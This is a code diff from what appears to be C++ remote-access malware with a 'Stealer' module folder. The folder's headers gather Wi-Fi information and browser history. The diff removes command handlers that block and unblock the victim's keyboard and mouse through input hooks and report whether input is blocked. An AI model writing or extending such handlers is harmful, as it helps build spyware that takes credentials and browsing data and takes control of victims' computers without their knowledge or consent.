@@ -11,7 +11,6 @@
 #include "KeyboardControl.h"
 #include "ChatManager.h"
 #include "../Stealer/WifiSearcher.h"
-#include "InputBlocker.h"
 #include "../Stealer/BrowserHistory.h"
 
 // Helper: Trả về JSON status chuẩn
@@ -295,45 +294,6 @@ json ProcessHandlers::getWifiInfo(const json &)
     wifiData["success"] = true;
 
     return wifiData;
-}
-
-// === INPUT BLOCKING ===
-json ProcessHandlers::blockInput(const json &)
-{
-    bool success = InputBlocker::Block();
-    if (success)
-    {
-        return {
-            {"type", "input_block_status"},
-            {"success", true},
-            {"blocked", true},
-            {"message", "Input blocked - User keyboard and mouse disabled"}};
-    }
-    return {
-        {"type", "input_block_status"},
-        {"success", false},
-        {"blocked", false},
-        {"message", "Failed to block input - Could not install hooks"}};
-}
-
-json ProcessHandlers::unblockInput(const json &)
-{
-    bool success = InputBlocker::Unblock();
-    return {
-        {"type", "input_block_status"},
-        {"success", success},
-        {"blocked", false},
-        {"message", success ? "Input unblocked - User can use keyboard and mouse" : "Failed to unblock input"}};
-}
-
-json ProcessHandlers::getBlockStatus(const json &)
-{
-    bool blocked = InputBlocker::IsBlocked();
-    return {
-        {"type", "input_block_status"},
-        {"success", true},
-        {"blocked", blocked},
-        {"message", blocked ? "Input is currently blocked" : "Input is not blocked"}};
 }
 
 // === BROWSER HISTORY ===
